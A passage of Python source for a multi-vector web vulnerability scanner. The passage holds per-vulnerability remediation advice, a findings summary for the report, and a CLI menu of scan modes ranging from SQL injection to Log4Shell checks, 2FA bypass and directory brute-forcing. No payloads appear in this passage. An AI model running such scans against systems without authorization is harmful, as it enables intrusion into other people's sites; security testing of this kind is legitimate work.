                            "  · Use a whitelist of allowed files/pages instead of dynamic includes.",
                            "  · Disable allow_url_include in PHP configuration.",
                            "  · Restrict file permissions and use chroot where possible.",
                        ]
                    elif "Remote File" in title or "RFI" in title:
                        out += [
                            "  · Disable allow_url_include and allow_url_fopen in PHP.",
                            "  · Never use user input in include(), require(), or file_get_contents().",
                            "  · Apply strict input validation and use absolute paths.",
                        ]
                    elif "SSRF" in title:
                        out += [
                            "  · Validate and whitelist all URLs supplied by users.",
                            "  · Block requests to internal IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x).",
                            "  · Use a dedicated egress proxy with strict allowlists.",
                            "  · Disable unnecessary URL-fetching functionality.",
                        ]
                    elif "File Upload" in title:
                        out += [
                            "  · Validate file type using magic bytes, not just extension or MIME type.",
                            "  · Rename uploaded files and store outside the web root.",
                            "  · Disable script execution in upload directories.",
                            "  · Implement file size limits and antivirus scanning.",
                        ]
                    elif "Misconfiguration" in title or "Security Misconfig" in title:
                        out += [
                            "  · Remove or restrict access to sensitive files and admin paths.",
                            "  · Disable directory listing and server version disclosure.",
                            "  · Implement all recommended security headers.",
                            "  · Regularly audit exposed endpoints and configuration files.",
                        ]
                    elif "XXE" in title or "XML External" in title:
                        out += [
                            "  · Disable external entity processing in the XML parser.",
                            "  · Use safe XML parsing libraries (e.g., defusedxml in Python).",
                            "  · Whitelist acceptable XML content types and reject unexpected inputs.",
                            "  · Consider using JSON instead of XML where possible.",
                        ]
                    elif "Directory Listing" in title:
                        out += [
                            "  · Disable directory listing in the web server config (Options -Indexes in Apache).",
                            "  · Add index files (index.html) to all public directories.",
                            "  · Audit all exposed directories and restrict access to sensitive ones.",
                            "  · Apply proper file system permissions to web root directories.",
                        ]
                    elif "JWT" in title:
                        out += [
                            "  · Use asymmetric algorithms (RS256/ES256) instead of HS256 where possible.",
                            "  · Always validate the 'alg' header — reject 'none' algorithm explicitly.",
                            "  · Use strong, random secrets (≥256 bits) for HMAC-based tokens.",
                            "  · Enforce token expiration (exp claim) server-side.",
                        ]
                    elif "GraphQL" in title:
                        out += [
                            "  · Disable GraphQL introspection in production environments.",
                            "  · Disable field suggestion error messages (set suggestSimilarFields=false).",
                            "  · Implement query depth limits and query complexity analysis.",
                            "  · Rate limit GraphQL endpoints and disable batch query support if unused.",
                        ]
                    elif "CRLF" in title:
                        out += [
                            "  · Validate and sanitize all user input — strip \\r (CR) and \\n (LF) characters.",
                            "  · Use framework-level header setting functions instead of raw string concatenation.",
                            "  · Implement Content-Security-Policy and X-Content-Type-Options headers.",
                        ]
                    elif "Prototype Pollution" in title:
                        out += [
                            "  · Validate and sanitize JSON input — reject keys like __proto__ and constructor.",
                            "  · Use Object.create(null) for plain dictionaries to avoid prototype chain.",
                            "  · Freeze critical prototypes: Object.freeze(Object.prototype).",
                            "  · Keep qs, lodash, and similar libraries updated (major source of PP vulnerabilities).",
                        ]
                    elif "Deserialization" in title:
                        out += [
                            "  · Never deserialize untrusted data — use safer data formats (JSON, Protocol Buffers).",
                            "  · If deserialization is needed, implement integrity checks (HMAC) on serialized data.",
                            "  · Use deserialization filters to whitelist allowed classes (Java SerialKiller).",
                            "  · Run deserialization in isolated sandboxes with minimal privileges.",
                        ]
                    elif "Business Logic" in title:
                        out += [
                            "  · Validate all business-critical parameters server-side — never trust client values.",
                            "  · Apply strict range checks on price, quantity, and privilege fields.",
                            "  · Implement server-side role enforcement — never base access on client-supplied role.",
                        ]
                    elif "Race Condition" in title:
                        out += [
                            "  · Use atomic database operations and row-level locking for state-changing endpoints.",
                            "  · Implement idempotency keys for one-time-use operations.",
                            "  · Add server-side checks to prevent duplicate processing (deduplication tokens).",
                        ]
                    elif "Clickjacking" in title:
                        out += [
                            "  · Add X-Frame-Options: DENY or SAMEORIGIN header.",
                            "  · Use Content-Security-Policy with frame-ancestors directive.",
                            "  · Prefer CSP frame-ancestors over X-Frame-Options (more flexible and modern).",
                        ]
                    elif "Sensitive Data" in title or "Sensitive" in title:
                        out += [
                            "  · Remove all hardcoded credentials, API keys, and secrets from source code.",
                            "  · Use environment variables or a secrets manager (Vault, AWS Secrets Manager).",
                            "  · Disable detailed error messages and stack traces in production.",
                            "  · Scan repositories regularly with tools like truffleHog or gitleaks.",
                        ]
                    elif "Parameter Pollution" in title or "HPP" in title:
                        out += [
                            "  · Accept only the first (or last) occurrence of each parameter — be consistent.",
                            "  · Validate that parameters are not duplicated in incoming requests.",
                            "  · Use strict input parsing libraries that reject duplicate keys.",
                        ]
                    elif "Account Enumeration" in title or "Enumeration" in title:
                        out += [
                            "  · Return identical error messages for all authentication failures.",
                            "  · Use the same response time for existing and non-existing accounts.",
                            "  · Implement CAPTCHA and rate limiting on login and password reset endpoints.",
                        ]
                    elif "2FA" in title or "OTP" in title or "MFA" in title:
                        out += [
                            "  · Enforce rate limiting and lockout after 3–5 failed OTP attempts.",
                            "  · Set short OTP expiry (60–120 seconds) and invalidate after first use.",
                            "  · Use 6–8 digit codes minimum — prefer TOTP over SMS.",
                        ]
                    elif "Smuggling" in title or "HTTP Request Smuggling" in title:
                        out += [
                            "  · Configure frontend and backend to use the same HTTP parsing (both CL or both TE).",
                            "  · Disable Transfer-Encoding support on the frontend proxy if not needed.",
                            "  · Keep all HTTP libraries and reverse proxies updated.",
                            "  · Use HTTP/2 end-to-end where possible to eliminate CL/TE ambiguity.",
                        ]
                    elif "SSTI" in title or "Template Injection" in title:
                        out += [
                            "  · Use sandboxed template engines — disable dangerous functions.",
                            "  · Never pass raw user input into template rendering functions.",
                            "  · Whitelist allowed template variables and expressions.",
                            "  · Use template engines with autoescaping enabled by default.",
                        ]
                    elif "NoSQL" in title:
                        out += [
                            "  · Validate and sanitize all JSON input — reject MongoDB operators ($gt, $ne, etc.).",
                            "  · Use parameterized queries with MongoDB drivers.",
                            "  · Whitelist allowed fields and operators in query construction.",
                        ]
                    elif "Mass Assignment" in title:
                        out += [
                            "  · Explicitly whitelist allowed fields in models (strong params pattern).",
                            "  · Never bind raw request body/JSON directly to database models.",
                            "  · Use DTOs (Data Transfer Objects) with field validation.",
                        ]
                    elif "JWT Algorithm Confusion" in title or "JWT Confusion" in title:
                        out += [
                            "  · Explicitly specify accepted algorithms — reject 'none' and HS256 when RS256 is used.",
                            "  · Never use the public key as an HMAC secret.",
                            "  · Validate and sanitize the 'kid' header before use.",
                        ]
                    elif "Cache Poisoning" in title:
                        out += [
                            "  · Include all user-influencing headers in the cache key.",
                            "  · Disable caching for responses that reflect user-controlled headers.",
                            "  · Use a strict Cache-Control policy for authenticated/personalized pages.",
                        ]
                    elif "WebSocket" in title:
                        out += [
                            "  · Validate and sanitize all WebSocket messages server-side.",
                            "  · Enforce same-origin policy — check Origin header on WS upgrade.",
                            "  · Apply authentication and rate limiting to WS endpoints.",
                        ]
                    elif "Path Traversal" in title:
                        out += [
                            "  · Validate and canonicalize file paths before use.",
                            "  · Use a whitelist of allowed files — never use user input as file path.",
                            "  · Chroot or jail file access to the web root directory.",
                        ]
                    elif "API Versioning" in title:
                        out += [
                            "  · Decommission and remove deprecated API versions completely.",
                            "  · Apply the same security controls to all API versions.",
                            "  · Maintain a version sunset policy with proper deprecation notices.",
                        ]
                    elif "BOPLA" in title:
                        out += [
                            "  · Never return sensitive fields in API responses by default.",
                            "  · Implement response field whitelisting at the API layer.",
                            "  · Validate and filter the 'fields' / 'include' query parameters.",
                        ]
                    elif "LDAP" in title:
                        out += [
                            "  · Use parameterized LDAP queries — never concatenate user input.",
                            "  · Escape all special LDAP characters in user input.",
                            "  · Apply the principle of least privilege for LDAP service accounts.",
                        ]
                    elif "XML Injection" in title:
                        out += [
                            "  · Escape all special XML characters in user input.",
                            "  · Use safe XML parsing libraries — avoid string concatenation for XML.",
                            "  · Validate XML input against a strict schema (XSD).",
                        ]
                    elif "Verb Tampering" in title:
                        out += [
                            "  · Disable dangerous HTTP methods (TRACE, DEBUG, TRACK) in server config.",
                            "  · Implement method-level access control on all endpoints.",
                            "  · Return 405 Method Not Allowed for unexpected HTTP verbs.",
                        ]
                    elif "Shellshock" in title:
                        out += [
                            "  · Update bash to a patched version (≥ 4.3 patch 25 / 3.2 patch 53).",
                            "  · Replace CGI scripts with modern web frameworks.",
                            "  · Sanitize all environment variables passed to bash subprocesses.",
                        ]
                    elif "Log4Shell" in title:
                        out += [
                            "  · Update Log4j to version 2.17.1+ immediately.",
                            "  · Set log4j2.formatMsgNoLookups=true as a workaround.",
                            "  · Block outbound LDAP/RMI connections from application servers.",
                        ]
                    elif "Spring4Shell" in title:
                        out += [
                            "  · Update Spring Framework to 5.3.18+ or 5.2.20+.",
                            "  · Update Spring Boot to 2.6.6+ or 2.5.12+.",
                            "  · Set setDisallowedFields to exclude class.* properties.",
                        ]
                    elif "SSI" in title:
                        out += [
                            "  · Disable SSI processing in web server configuration.",
                            "  · Never pass user input into SSI-processed files.",
                            "  · Use Options -Includes in Apache or equivalent.",
                        ]
                    elif "CSTI" in title:
                        out += [
                            "  · Never interpolate user input into client-side templates.",
                            "  · Use ng-non-bindable in Angular for user-supplied content.",
                            "  · Apply Content-Security-Policy to restrict script execution.",
                        ]
                    out.append("")
                return out

            lines += _section("SQL Injection",             result.sqli_vulnerabilities or [])
            lines += _section("Cross-Site Scripting",      result.xss_vulnerabilities or [])
            lines += _section("IDOR",                      result.idor_vulnerabilities or [])
            lines += _section("CSRF",                      result.csrf_vulnerabilities or [], param_label="Affected Target")
            lines += _section("Remote Code Execution",     result.rce_vulnerabilities or [])
            lines += _section("Local File Inclusion",      result.lfi_vulnerabilities or [])
            lines += _section("Remote File Inclusion",     result.rfi_vulnerabilities or [])
            lines += _section("SSRF",                      result.ssrf_vulnerabilities or [])
            lines += _section("File Upload",               result.fileupload_vulnerabilities or [])
            lines += _section("Security Misconfiguration", result.secmisconf_vulnerabilities or [])
            lines += _section("Subdomain Takeover",        result.sdt_vulnerabilities or [], param_label="Subdomain")
            lines += _section("Open Redirect",             result.openredirect_vulnerabilities or [])
            lines += _section("CORS Misconfiguration",     result.cors_vulnerabilities or [])
            lines += _section("Host Header Injection",     result.hostheader_vulnerabilities or [])
            lines += _section("XXE Injection",             result.xxe_vulnerabilities or [])
            lines += _section("Directory Listing",         result.dirlist_vulnerabilities or [])
            lines += _section("JWT Vulnerability",         result.jwt_vulnerabilities or [])
            lines += _section("GraphQL Misconfiguration",  result.graphql_vulnerabilities or [])
            lines += _section("CRLF Injection",            result.crlf_vulnerabilities or [])
            lines += _section("Prototype Pollution",       result.prototype_vulnerabilities or [])
            lines += _section("Insecure Deserialization",  result.deserial_vulnerabilities or [])
            lines += _section("Business Logic",            result.bizlogic_vulnerabilities or [])
            lines += _section("Race Condition",            result.race_vulnerabilities or [])
            lines += _section("Clickjacking",              result.clickjacking_vulnerabilities or [])
            lines += _section("Sensitive Data Exposure",   result.sensitive_vulnerabilities or [])
            lines += _section("HTTP Parameter Pollution",  result.hpp_vulnerabilities or [])
            lines += _section("Account Enumeration",       result.enum_vulnerabilities or [])
            lines += _section("2FA / OTP Bypass",          result.mfa_vulnerabilities or [])
            lines += _section("HTTP Request Smuggling",    result.smuggling_vulnerabilities or [])
            lines += _section("SSTI",                    result.ssti_vulns or [])
            lines += _section("NoSQL Injection",          result.nosqli_vulns or [])
            lines += _section("Mass Assignment",          result.massassign_vulns or [])
            lines += _section("JWT Algorithm Confusion",  result.jwt_conf_vulns or [])
            lines += _section("Web Cache Poisoning",      result.cache_vulns or [])
            lines += _section("WebSocket Injection",      result.websocket_vulns or [])
            lines += _section("Path Traversal",           result.path_trav_vulns or [])
            lines += _section("API Versioning Abuse",     result.api_abuse_vulns or [])
            lines += _section("BOPLA",                    result.bopla_vulns or [])
            lines += _section("LDAP Injection",           result.ldap_vulns or [])
            lines += _section("XML Injection",            result.xml_vulns or [])
            lines += _section("HTTP Verb Tampering",      result.verb_vulns or [])
            lines += _section("Shellshock",               result.shellshock_vulns or [])
            lines += _section("Log4Shell",                result.log4shell_vulns or [])
            lines += _section("Spring4Shell",             result.spring_vulns or [])
            lines += _section("SSI Injection",            result.ssi_vulns or [])
            lines += _section("CSTI",                     result.csti_vulns or [])

            lines += [
                "=" * 72,
                "  SUMMARY",
                "=" * 72,
                "",
                f"  Target             : {result.url}",
                f"  Issues Found       : {total_vulns}",
                f"  Critical           : {sum(1 for v in all_vulns if v.severity == 'CRITICAL')}",
                f"  High               : {sum(1 for v in all_vulns if v.severity == 'HIGH')}",
                f"  Medium             : {sum(1 for v in all_vulns if v.severity == 'MEDIUM')}",
                f"  Low                : {sum(1 for v in all_vulns if v.severity == 'LOW')}",
                f"  SQLi               : {len(result.sqli_vulnerabilities or [])}",
                f"  XSS                : {len(result.xss_vulnerabilities or [])}",
                f"  IDOR               : {len(result.idor_vulnerabilities or [])}",
                f"  CSRF               : {len(result.csrf_vulnerabilities or [])}",
                f"  RCE                : {len(result.rce_vulnerabilities or [])}",
                f"  LFI                : {len(result.lfi_vulnerabilities or [])}",
                f"  RFI                : {len(result.rfi_vulnerabilities or [])}",
                f"  SSRF               : {len(result.ssrf_vulnerabilities or [])}",
                f"  File Upload        : {len(result.fileupload_vulnerabilities or [])}",
                f"  Sec Misconfig      : {len(result.secmisconf_vulnerabilities or [])}",
                f"  Subdomain Takeover : {len(result.sdt_vulnerabilities or [])}",
                f"  Open Redirect      : {len(result.openredirect_vulnerabilities or [])}",
                f"  CORS               : {len(result.cors_vulnerabilities or [])}",
                f"  Host Header        : {len(result.hostheader_vulnerabilities or [])}",
                f"  XXE                : {len(result.xxe_vulnerabilities or [])}",
                f"  Directory Listing  : {len(result.dirlist_vulnerabilities or [])}",
                f"  JWT                : {len(result.jwt_vulnerabilities or [])}",
                f"  GraphQL            : {len(result.graphql_vulnerabilities or [])}",
                f"  CRLF               : {len(result.crlf_vulnerabilities or [])}",
                f"  Prototype Pollution: {len(result.prototype_vulnerabilities or [])}",
                f"  Deserialization    : {len(result.deserial_vulnerabilities or [])}",
                f"  Business Logic     : {len(result.bizlogic_vulnerabilities or [])}",
                f"  Race Condition     : {len(result.race_vulnerabilities or [])}",
                f"  Clickjacking       : {len(result.clickjacking_vulnerabilities or [])}",
                f"  Sensitive Data     : {len(result.sensitive_vulnerabilities or [])}",
                f"  HTTP Param Poll.   : {len(result.hpp_vulnerabilities or [])}",
                f"  Account Enum.      : {len(result.enum_vulnerabilities or [])}",
                f"  2FA/OTP Bypass     : {len(result.mfa_vulnerabilities or [])}",
                f"  HTTP Smuggling     : {len(result.smuggling_vulnerabilities or [])}",
                f"  SSTI               : {len(result.ssti_vulns or [])}",
                f"  NoSQL Injection    : {len(result.nosqli_vulns or [])}",
                f"  Mass Assignment    : {len(result.massassign_vulns or [])}",
                f"  JWT Confusion      : {len(result.jwt_conf_vulns or [])}",
                f"  Cache Poisoning    : {len(result.cache_vulns or [])}",
                f"  WebSocket Inj.     : {len(result.websocket_vulns or [])}",
                f"  Path Traversal     : {len(result.path_trav_vulns or [])}",
                f"  API Versioning     : {len(result.api_abuse_vulns or [])}",
                f"  BOPLA              : {len(result.bopla_vulns or [])}",
                f"  LDAP Injection     : {len(result.ldap_vulns or [])}",
                f"  XML Injection      : {len(result.xml_vulns or [])}",
                f"  Verb Tampering     : {len(result.verb_vulns or [])}",
                f"  Shellshock         : {len(result.shellshock_vulns or [])}",
                f"  Log4Shell          : {len(result.log4shell_vulns or [])}",
                f"  Spring4Shell       : {len(result.spring_vulns or [])}",
                f"  SSI Injection      : {len(result.ssi_vulns or [])}",
                f"  CSTI               : {len(result.csti_vulns or [])}",
                "",
                "  This report was generated automatically by Y2S Security Scanner.",
                "  All findings should be verified manually before submission.",
                "  Use responsibly and only on systems you are authorized to test.",
                "",
                "=" * 72,
            ]

            with open(report_path, 'w', encoding='utf-8') as f:
                f.write("\n".join(lines))

        return results_dir, reports_dir

class CLI:
    def __init__(self):
        self.console = Console()

    def show_banner(self):
        banner = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠖⠃⠀⠀⠀⡁⠀⠀⠀⠀⠀⠐⠆⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢔⡤⠊⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠁⠀⠀⠘⠁⢀⠀⠀⠀⠀⢈⠓⠂⠠⡄⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠿⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠁⠀⠠⡚⠁⢀⣙⣀⣈⡩⠬⢁⠀⢑⠶⠤⡆⠤⡀⠀⠀⠀⠀⠀⠀⢀⠴⢲⣋⣽⣷⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⢠⠀⠀⣶⠃⠗⣡⣶⣮⣿⡿⠿⠿⢿⣿⣷⣶⣤⣤⠤⠴⠦⠬⣤⣤⠄⣉⠉⠝⢲⣿⡷⠻⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠁⡀⡸⠁⣰⣿⡿⠛⠋⣁⡀⠤⠤⢄⡀⠈⠛⢯⣿⣟⣾⣶⣶⣮⣭⣵⣾⣿⣟⠿⠉⢨⠖⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⢠⠳⡧⣻⡿⠋⢀⠒⠉⠀⠀⠀⠀⠀⠀⠉⠢⠀⠀⠙⠛⣻⣿⣿⣿⢿⣿⣿⠟⡱⠖⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢠⣧⠓⣾⣿⠁⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢦⣠⣾⣿⠿⣿⣿⣿⡿⣫⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠂⢃⣸⣿⠇⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⠟⢿⠁⠸⡿⣿⣯⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢘⡄⠘⣿⣿⠀⠸⡀⠀⠀⠀⠀⠀⢀⣀⣴⣾⣿⡿⡟⡋⠐⡇⠀⢸⣿⣿⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⠘⢰⣿⡿⡆⠀⣇⠀⣀⣠⣤⣶⣿⢷⢟⠻⠀⠈⠀⠀⠀⡇⠀⣼⣿⣿⠂⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⢀⡴⢯⣾⠟⡏⢀⣠⣿⣿⣿⣟⢟⡋⠅⠘⠉⠀⠀⠀⠀⢀⠀⠁⢠⣿⣟⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⣻⣷⡿⢙⣩⣶⡿⠿⠛⠉⠑⢡⡁⠀⠀⠀⠀⠀⠀⢀⠔⠁⠀⣰⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣡⣾⣥⣾⢫⡦⠾⠛⠙⠉⠀⠀⢀⣀⠀⠈⠙⠓⠦⠤⠤⠀⠘⠁⢀⡤⣾⡿⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠔⣴⣾⣿⣿⢟⢝⠢⠃⢀⣤⢴⣾⣮⣷⣶⢿⣶⡤⣐⡀⠀⣠⣤⢶⣪⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡀⣦⣾⡿⡛⠵⠺⢈⡠⠶⠿⠥⠥⡭⠉⠉⢱⡛⠻⠿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠭⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⢴⠕⣋⠝⠕⠐⠀⠔⠉⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠉⠁⠁⠁⠁⠈⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣠⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
        self.console.print(banner, style="bold cyan")
        self.console.print("Multi-Vector Security Analysis Tool By Y2S", style="bold white", justify="center")

    def get_scan_mode(self) -> str:
        self.console.print("\n[bold cyan]╔══════════════════════════════════╗[/bold cyan]")
        self.console.print("[bold cyan]║        Y2S — Scan Mode           ║[/bold cyan]")
        self.console.print("[bold cyan]╚══════════════════════════════════╝[/bold cyan]")
        self.console.print("  [dim][00][/dim]  Exit")
        self.console.print("  [dim][01][/dim]  Single URL — Comprehensive Scan")
        self.console.print("  [dim][02][/dim]  Multiple URLs from file")
        self.console.print("  [cyan]─── Injection ──────────────────────[/cyan]")
        self.console.print("  [dim][03][/dim]  SQL Injection")
        self.console.print("  [dim][04][/dim]  XSS / SSTI")
        self.console.print("  [dim][05][/dim]  Remote Code Execution")
        self.console.print("  [dim][06][/dim]  Local File Inclusion")
        self.console.print("  [dim][07][/dim]  Remote File Inclusion")
        self.console.print("  [dim][08][/dim]  XXE Injection")
        self.console.print("  [dim][09][/dim]  CRLF Injection")
        self.console.print("  [cyan]─── Access Control ─────────────────[/cyan]")
        self.console.print("  [dim][10][/dim]  IDOR")
        self.console.print("  [dim][11][/dim]  CSRF")
        self.console.print("  [dim][12][/dim]  JWT Vulnerability")
        self.console.print("  [dim][13][/dim]  Business Logic")
        self.console.print("  [dim][14][/dim]  Account Enumeration")
        self.console.print("  [dim][15][/dim]  2FA / OTP Bypass")
        self.console.print("  [cyan]─── Server-Side ────────────────────[/cyan]")
        self.console.print("  [dim][16][/dim]  SSRF")
        self.console.print("  [dim][17][/dim]  Open Redirect")
        self.console.print("  [dim][18][/dim]  Host Header Injection")
        self.console.print("  [dim][19][/dim]  Prototype Pollution")
        self.console.print("  [dim][20][/dim]  Insecure Deserialization")
        self.console.print("  [dim][21][/dim]  Race Condition")
        self.console.print("  [dim][22][/dim]  HTTP Request Smuggling")
        self.console.print("  [cyan]─── Misconfiguration ───────────────[/cyan]")
        self.console.print("  [dim][23][/dim]  Security Misconfiguration")
        self.console.print("  [dim][24][/dim]  Directory Listing")
        self.console.print("  [dim][25][/dim]  CORS Misconfiguration")
        self.console.print("  [dim][26][/dim]  Clickjacking")
        self.console.print("  [dim][27][/dim]  File Upload")
        self.console.print("  [dim][28][/dim]  Subdomain Takeover")
        self.console.print("  [dim][29][/dim]  GraphQL Misconfiguration")
        self.console.print("  [dim][30][/dim]  Sensitive Data Exposure")
        self.console.print("  [dim][31][/dim]  HTTP Parameter Pollution")
        self.console.print("  [cyan]─── External ───────────────────────[/cyan]")
        self.console.print("  [dim][32][/dim]  VirusTotal Only")
        self.console.print("  [cyan]─── Advanced / CVEs ────────────────[/cyan]")
        self.console.print("  [dim][33][/dim]  SSTI (Standalone)")
        self.console.print("  [dim][34][/dim]  NoSQL Injection")
        self.console.print("  [dim][35][/dim]  LDAP Injection")
        self.console.print("  [dim][36][/dim]  XML Injection")
        self.console.print("  [dim][37][/dim]  SSI Injection")
        self.console.print("  [dim][38][/dim]  CSTI")
        self.console.print("  [dim][39][/dim]  Mass Assignment")
        self.console.print("  [dim][40][/dim]  BOPLA")
        self.console.print("  [dim][41][/dim]  API Versioning Abuse")
        self.console.print("  [dim][42][/dim]  Web Cache Poisoning")
        self.console.print("  [dim][43][/dim]  WebSocket Injection")
        self.console.print("  [dim][44][/dim]  Path Traversal")
        self.console.print("  [dim][45][/dim]  HTTP Verb Tampering")
        self.console.print("  [dim][46][/dim]  JWT Algorithm Confusion")
        self.console.print("  [dim][47][/dim]  Shellshock  (CVE-2014-6271)")
        self.console.print("  [dim][48][/dim]  Log4Shell   (CVE-2021-44228)")
        self.console.print("  [dim][49][/dim]  Spring4Shell (CVE-2022-22965)")
        self.console.print("  [cyan]─── Combos ─────────────────────────[/cyan]")
        self.console.print("  [dim][ [bold yellow]A[/bold yellow] ][/dim]  Injection Suite  (SQLi · XSS · RCE · LFI · RFI · XXE · CRLF)")
        self.console.print("  [dim][ [bold yellow]B[/bold yellow] ][/dim]  Access Control   (IDOR · CSRF · JWT · BizLogic · Enum · 2FA)")
        self.console.print("  [dim][ [bold yellow]C[/bold yellow] ][/dim]  Server-Side      (SSRF · Redirect · HostHdr · Proto · Deserial · Race · Smuggling)")
        self.console.print("  [dim][ [bold yellow]D[/bold yellow] ][/dim]  Misconfiguration (Misconfig · DirList · CORS · Clickjack · Upload · SDT · GraphQL · Sensitive · HPP)")
        self.console.print("  [dim][ [bold yellow]E[/bold yellow] ][/dim]  New Injection    (SSTI · NoSQLi · LDAP · XML · SSI · CSTI)")
        self.console.print("  [dim][ [bold yellow]F[/bold yellow] ][/dim]  CVE Suite        (MassAssign · BOPLA · APIVer · Cache · WS · PathTrav · Verb · JWTConf · Shellshock · Log4Shell · Spring4Shell)")
        self.console.print("  [cyan]─── Tools ──────────────────────────[/cyan]")
        self.console.print("  [dim][50][/dim]  ⚙  Settings  (proxy · rate · cookies · auth)")
        self.console.print("  [dim][51][/dim]  🔍  WAF Detect")
        self.console.print("  [dim][52][/dim]  📂  Dir Brute")
        self.console.print("  [dim][53][/dim]  🌐  Subdomain Enum")
        self.console.print("  [dim][54][/dim]  🔎  Param Discovery")
